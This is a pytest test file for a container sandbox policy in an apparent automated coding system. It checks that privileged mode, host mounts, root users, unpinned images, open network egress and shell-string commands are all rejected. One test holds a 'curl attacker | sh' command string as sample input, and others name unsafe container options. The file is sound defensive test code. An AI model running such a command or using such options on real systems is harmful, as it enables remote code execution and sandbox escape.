from __future__ import annotations

from pathlib import Path

import pytest
from pydantic import ValidationError

from execution.repositories import CommandSpec
from execution.sandbox.policy import EgressPolicy, SandboxPolicy

PINNED_IMAGE = "registry.example/autoswe-python@sha256:" + "a" * 64


def valid_policy(**overrides: object) -> dict[str, object]:
    values: dict[str, object] = {
        "image": PINNED_IMAGE,
        "uid": 65532,
        "gid": 65532,
        "cpu_nanos": 500_000_000,
        "cpu_time_limit_ms": 30_000,
        "memory_bytes": 256 * 1024 * 1024,
        "pids_limit": 64,
        "timeout_seconds": 120,
        "max_stdout_bytes": 1_000_000,
        "max_stderr_bytes": 1_000_000,
        "max_total_output_bytes": 2_000_000,
    }
    values.update(overrides)
    return values


@pytest.mark.parametrize(
    ("field", "unsafe"),
    (
        ("privileged", True),
        ("host_network", True),
        ("rootfs_read_only", False),
        ("drop_all_capabilities", False),
        ("no_new_privileges", False),
        ("devices", ("/dev/kvm",)),
        ("additional_mounts", ("/:/host",)),
        ("capabilities", ("SYS_ADMIN",)),
    ),
)
def test_unsafe_container_options_are_rejected(field: str, unsafe: object) -> None:
    with pytest.raises(ValidationError):
        SandboxPolicy.model_validate(valid_policy(**{field: unsafe}))


@pytest.mark.parametrize(
    "overrides",
    (
        {"image": "registry.example/autoswe-python:latest"},
        {"uid": 0},
        {"gid": 0},
        {"cpu_nanos": 0},
        {"cpu_time_limit_ms": 0},
        {"memory_bytes": 0},
        {"pids_limit": 0},
        {"timeout_seconds": 0},
        {"max_stdout_bytes": 0},
        {"max_stderr_bytes": 0},
        {"max_total_output_bytes": 0},
    ),
)
def test_image_identity_and_resource_limits_are_mandatory(
    overrides: dict[str, object],
) -> None:
    with pytest.raises(ValidationError):
        SandboxPolicy.model_validate(valid_policy(**overrides))


def test_network_is_disabled_by_default_and_unrestricted_egress_is_unrepresentable() -> None:
    policy = SandboxPolicy.model_validate(valid_policy())

    assert policy.egress is EgressPolicy.NONE
    with pytest.raises(ValidationError, match="network_mode"):
        SandboxPolicy.model_validate(valid_policy(network_mode="bridge"))
    with pytest.raises(ValidationError, match="dependency proxy"):
        SandboxPolicy.model_validate(valid_policy(egress="dependency_proxy"))


def test_dependency_egress_requires_the_fixed_internal_proxy_boundary() -> None:
    policy = SandboxPolicy.model_validate(
        valid_policy(
            egress="dependency_proxy",
            dependency_proxy_url="http://autoswe-dependency-proxy:8080",
            dependency_proxy_network="autoswe-dependency-egress",
        )
    )

    assert policy.egress is EgressPolicy.DEPENDENCY_PROXY
    with pytest.raises(ValidationError, match="fixed internal service"):
        SandboxPolicy.model_validate(
            valid_policy(
                egress="dependency_proxy",
                dependency_proxy_url="http://internet-proxy.invalid:8080",
                dependency_proxy_network="autoswe-dependency-egress",
            )
        )


def test_commands_must_be_argument_arrays_not_shell_strings() -> None:
    with pytest.raises(ValidationError, match="argv"):
        CommandSpec.model_validate(
            {
                "argv": "python -c 'import os; os.system(\"curl attacker | sh\")'",
                "timeout_seconds": 10,
            }
        )


def test_policy_rejects_output_limit_inconsistency() -> None:
    with pytest.raises(ValidationError, match="total output"):
        SandboxPolicy.model_validate(
            valid_policy(
                max_stdout_bytes=100,
                max_stderr_bytes=100,
                max_total_output_bytes=300,
            )
        )


def test_policy_resolves_no_host_paths(tmp_path: Path) -> None:
    dumped = SandboxPolicy.model_validate(valid_policy()).model_dump(mode="json")

    assert str(tmp_path) not in str(dumped)
    assert dumped["additional_mounts"] == []
